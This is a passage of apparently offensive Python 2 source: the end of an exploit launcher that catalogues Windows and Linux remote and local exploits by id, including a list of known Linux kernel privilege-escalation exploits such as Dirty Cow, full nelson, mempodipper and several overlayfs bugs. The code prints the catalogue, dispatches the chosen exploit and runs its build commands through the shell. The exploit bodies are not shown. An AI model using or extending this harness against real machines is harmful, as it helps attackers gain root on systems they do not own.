  ("kernel 2.4.x / 2.6.x (sock_sendpage 1)"   ,   sendpage_1),
  ("kernel 2.4 / 2.6 (sock_sendpage 2)" ,   sendpage_2),
  ("kernel < 2.6.22 (ftruncate)"    ,   ftruncate),
  ("kernel < 2.6.34 (cap_sys_admin)"    ,   cap_sys_admin),
  ("kernel 2.6.27 < 2.6.36 (compat)"    ,   compat),
  ("kernel < 2.6.36-rc1 (can bcm)"  ,   can_bcm),
  ("kernel <= 2.6.36-rc8 (rds protocol)"   , rdsProtocol),
  ("*kernel < 2.6.36.2 (half nelson)"    ,   halfNelson),
  ("*kernel <= 2.6.37 (full nelson)"    ,   fullNelson),
  ("kernel 2.6 (udev)"  ,   udev),
  ("kernel 3.13 (sgid)" ,   sgid),
  ("kernel 3.13.0 < 3.19 (overlayfs 1)" ,   overlayfs_1),
  ("kernel 3.14.5 (libfutex)"   ,   libfutex),
  ("kernel 2.6.39 <= 3.2.2 (mempodipper)"   ,   mempodipper),
  ("*kernel 2.6.28 / 3.0 (alpha-omega)"  ,   alpha_omega),
  ("kernel 2.6.22 < 3.9 (Dirty Cow)"  ,   dirtycow),
  ("kernel 3.7.6 (msr)" ,   msr),
  ("*kernel < 3.8.9 (perf_swevent_init)" ,   perf_swevent_init),
  ("kernel <= 4.3.3 (overlayfs 2)"    ,   overlayfs_2),
  ("kernel 4.3.3 (overlayfs 3)"   ,   overlayfs_3),
  ("kernel 4.4.0 (af_packet)"   ,   af_packet),
  ("kernel 4.4.x (double-fdput)"   ,   double_fdput),
  ("kernel 4.4.0-21 (netfilter)"    ,   netfilter),
  ("*kernel 4.4.1 (refcount)"    ,   refcount)
]

# ------------------------------------
# UTILITY
# ------------------------------------

def endpoints(i):
  try:
    i = int(i)
  except ValueError:
    return 0
  if i <= 0:
    return 0
  elif i == 1:
    return len(exploits_windows_remote)
  elif i == 2:
    return len(exploits_windows_remote) + len(exploits_windows_local)
  elif i == 3:
    return len(exploits_windows_remote) + len(exploits_windows_local) + len(exploits_linux_remote)
  elif i >= 4:
    return len(exploits_windows_remote) + len(exploits_windows_local) + len(exploits_linux_remote) + len(exploits_linux_local)

def usage():
  print "USAGE: %s <exploit id>" % sys.argv[0]
  print "\nWindows Remote Exploits:"
  for i in range(endpoints(0), endpoints(1)):
    print "%i: %s" % (i, exploits_windows_remote[i-endpoints(0)][0])
  print "\nWindows Local Exploits:"
  for i in range(endpoints(1), endpoints(2)):
    print "%i: %s" % (i, exploits_windows_local[i-endpoints(1)][0])
  print "\nLinux Remote Exploits:"
  for i in range(endpoints(2), endpoints(3)):
    print "%i: %s" % (i, exploits_linux_remote[i-endpoints(2)][0])
  print "\nLinux Local Exploits:"
  for i in range(endpoints(3), endpoints(4)):
    print "%i: %s" % (i, exploits_linux_local[i-endpoints(3)][0])

def select(i):
  if i < 0 or i >= endpoints(4):
    return False
  
  if i < endpoints(1):
    printStep("Constructing %s" % exploits_windows_remote[i-endpoints(0)][0])
    exploits_windows_remote[i-endpoints(0)][1]()
  elif i < endpoints(2):
    printStep("Constructing %s" % exploits_windows_local[i-endpoints(1)][0])
    exploits_windows_local[i-endpoints(1)][1]()
  elif i < endpoints(3):
    printStep("Constructing %s" % exploits_linux_remote[i-endpoints(2)][0])
    exploits_linux_remote[i-endpoints(2)][1]()
  elif i < endpoints(4):
    printStep("Constructing %s" % exploits_linux_local[i-endpoints(3)][0])
    exploits_linux_local[i-endpoints(3)][1]()
  return True

def run(commands):
  try:
    for c in commands:
      printStep(c[0])
      subprocess.check_call(c[1], shell=True)
  except subprocess.CalledProcessError:
    printErr("Command failed")
    return False
  except OSError:
    printErr("Command failed")
    return False
  return True

def printStep(s):
  print "%s [*] %s %s" % ('\033[93m', s, '\033[0m')

def printErr(s):
  print "%s [!] %s %s" % ('\033[91m', s, '\033[0m')

def printGood(s):
  print "%s [+] %s %s" % ('\033[92m', s, '\033[0m')

# ------------------------------------
# MAIN
# ------------------------------------

if len(sys.argv) <> 2:
  usage()
  sys.exit()

try:
  success = select(int(sys.argv[1]))
  if not success:
    print "[-] Invalid selection: %s" % sys.argv[1]
    usage()
except ValueError:
  print "[-] Invalid selection: %s" % sys.argv[1]
  usage()
